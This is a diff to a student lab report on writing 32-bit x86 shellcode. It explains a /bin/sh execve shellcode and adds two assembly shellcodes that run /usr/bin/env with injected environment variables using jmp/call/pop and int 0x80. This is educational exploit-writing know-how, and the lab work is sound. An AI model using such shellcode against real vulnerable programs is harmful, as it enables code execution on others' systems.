@@ -271,29 +271,108 @@ push "/bin"
 ---
 
 # Task 2 $-$ Using Code Segment
-## Provide detailed explanation
-1. ...
+## 2.1 Provide detailed explanation of mysh2
+- The BITS 32 directive specifies that the code should be assembled for a 32-bit x86 architecture.
+- The `jmp short two` instruction causes the program to jump to the label `two`.
+- The `one` label marks the beginning of a block of code that is called by the `call one` instruction at the `two` label. This block of code starts by popping a value from the stack and storing it in the `ebx` register via the `pop ebx` instruction.
+- The code then sets the value of the eax register to zero using the `xor eax, eax` instruction. 
+- The `mov [ebx+7], al` instruction stores the least significant byte of the eax register (which is zero) at the memory location specified by the address in `ebx` plus 7.
+- The `mov [ebx+8], ebx` instruction stores the value of the `ebx` register at the memory location specified by the address in `ebx` plus 8. 
+- The `mov [ebx+12], eax` instruction stores the value of the eax register at the memory location specified by the address in `ebx` plus 12.
+- The `lea ecx, [ebx+8]` instruction loads the effective address specified by `ebx` plus 8 into the ecx register. 
+- The `xor edx, edx` instruction sets the value of the edx register to zero.
+- The `mov al, 0x0b` instruction moves the value `0x0b` (11 in decimal) into the least significant byte of the eax register. 
+- The int `0x80` instruction is a software interrupt that causes the processor to execute a specific system call. In this case, the value in the al register specifies which system call to execute.
+- The `db '/bin/sh*AAAABBBB'` directive defines a string that is stored in the program's data section. This string appears to be the string `'/bin/sh'` followed by 8 bytes of data (`'AAAABBBB'`).
 
-(FIX THIS)
-The BITS 32 directive specifies that the code should be assembled for a 32-bit x86 architecture.
+## 2.2 Run with custom environment
+### The naive way (`myenv2.s`)
+- To stay simple, we can easily change the string in mysh2 defined after `db` with the `/usr/bin/env` command. 
+- Then we just need to figure out a way to put env variables in the right spot and let the program execute. But we already know how:
+  - exploit xor to have a zero-holding register
+  - push 0 to terminate array
+  - for every env variable:
+    - push 0 to terminate its string
+    - push its actual value, for this task we have both of four bytes so we can go in one shot for each one
+    - save pointer to it in a register
+  - push 0 and the pointers to the variables
+  - save in edx the beginning of env
+  - ✅
+- these steps combined with the one-two label setup of `mysh2.s` allow us to have a first working solution:
+  ```asm
+  section .text
+    global _start
+      _start:
+        BITS 32
+        jmp short two
+      one:
+        pop ebx 					; [1]
+        xor eax, eax
+        push eax ; env[2]=0
+        push eax ; terminates env[1] string
+        push "a=11" ; env[1]
+        mov esi, esp ; saves pointer to env[1]
+        push eax ; terminates env[0] string
+        push "b=22" ; env[0]
+        mov edi, esp ; saves pointer to env[0]
+        push eax
+        ; push pointers to env and save in edx beginning of env
+        push edi
+        push esi
+        mov edx, esp
+        
+        mov al,  0x0b  
+        int 0x80
+      two:
+        call one
+        db '/usr/bin/env'
+  ```
 
-The jmp short two instruction causes the program to jump to the two label.
-
-The one label marks the beginning of a block of code that is called by the call one instruction at the two label. This block of code starts by popping a value from the stack and storing it in the ebx register using the pop ebx instruction.
-
-The code then sets the value of the eax register to zero using the xor eax, eax instruction. The mov [ebx+7], al instruction stores the least significant byte of the eax register (which is zero) at the memory location specified by the address in ebx plus 7.
-
-The mov [ebx+8], ebx instruction stores the value of the ebx register at the memory location specified by the address in ebx plus 8. The mov [ebx+12], eax instruction stores the value of the eax register at the memory location specified by the address in ebx plus 12.
-
-The lea ecx, [ebx+8] instruction loads the effective address specified by ebx plus 8 into the ecx register. The xor edx, edx instruction sets the value of the edx register to zero.
-
-The mov al, 0x0b instruction moves the value 0x0b (11 in decimal) into the least significant byte of the eax register. The int 0x80 instruction is a software interrupt that causes the processor to execute a specific system call. In this case, the value in the al register specifies which system call to execute.
-
-The db '/bin/sh*AAAABBBB' directive defines a string that is stored in the program's data section. This string appears to be the string '/bin/sh' followed by 8 bytes of data ('AAAABBBB').
-
-I hope this helps to clarify the meaning of this assembly code. Let me know if you have any further questions.
-(FINISH FIX)
-
+### The pro way (`myenv2_better.s`)
+- We can come up with a better solution, and make full use of the code segment by encoding also the environment variables in the string alongside with the command and tinker with it to put things in the right places. By smartly using the pointers to memory we can virtually have an infinite numebr of ebvironment variables because we are not limited to registers to store pointers value along the way.
+- So, first we need to put everything in the string so: `db '/usr/bin/env*a=11b=22'`
+- then in the one function, after popping and preparing eax to hold zero, we replace the placeholder with a 0 (`mov [ebx+12], al`)
+- we push 0 to terminate the array
+- we push 0 to terminate env[1] and we push it by directly pointing to it, since its in `ebx+13`, so: `push dword [ebx+13]`; we need the whole 4 bytes, hence the `dword` keyword
+- we go analogously for env[0], which is in `ebx+17`
+- now to push the pointers we exploit the stack pointer, we know the last thing we pushed was env[1] so we load the effective address of `esp+4` in `esi` (which we can reuse over and over since we immediatley make use of the value we make it hold) and push it. Then we did againg for env[0], but now since we pushed again and there's also a 0 we need to go to `esp+16`. 
+  ```asm
+  lea esi, [esp+4]
+  push esi
+  lea esi, [esp+16]
+  push esi
+  ```
+- finally we can put in edx the beginning of env: `mov edx, esp`
+- The final result is:
+  ```asm
+  section .text
+  global _start
+    _start:
+			BITS 32
+			jmp short two
+		one:
+			pop ebx 					
+			xor eax, eax
+			mov [ebx+12], al ; replace placeholder * with zero
+			push eax ; env[2]=0
+			push eax ; terminate env[1]
+			push dword [ebx+13] ; push env[1]
+			push eax ; terminate env[1]
+			push dword [ebx+17] ; push env[1]
+			
+			push eax
+			lea esi, [esp+4]
+			push esi
+			lea esi, [esp+16]
+			push esi
+			mov edx, esp
+			
+			mov al,  0x0b     ; usual stuff
+			int 0x80
+		two:
+			call one
+			db '/usr/bin/env*a=11b=22'
+  ```
 ---
 
 # Task 3 $-$ Writing 64-bit Shellcode
